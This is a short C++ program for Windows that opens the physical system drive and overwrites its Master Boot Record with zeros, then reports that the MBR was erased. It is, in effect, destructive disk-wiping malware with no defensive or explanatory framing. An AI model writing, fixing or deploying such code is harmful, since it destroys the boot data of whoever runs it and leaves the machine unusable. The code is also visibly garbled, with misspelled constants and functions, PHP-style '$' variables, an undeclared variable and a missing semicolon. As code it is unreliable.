#include "stdafx.h"
#include <Windows.h>
#include <iostream>
using namespace std;
#define MBR_SIZE 512
int main() {
	char mbr[MBR_SIZE];
	ZeroMemory($mbr, (sizeOf mbr));
	HANDLE MasterBootRecord = CreateFile(L"\\\\.\\PhysicalDrive0",
		GENERIC_ALL,
		FILE_SHARED_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXSISTING,
		NULL,
		NULL);
	if (WriteFile(MasterBootRecord, mbr, MBR_SIZE, $write, NULL) == TRUE)
	{
		cout << "MBR was successfuly erased" << end1;
		Sleep(3000);
		ExitProcess(0);
	}
	else {
		cout << "Something has gone wrong" << end1;
		Sleep(3000);
		ExitProcess(0);
	}
	CloseHandle(MasterBootRecord)
	return 0;
}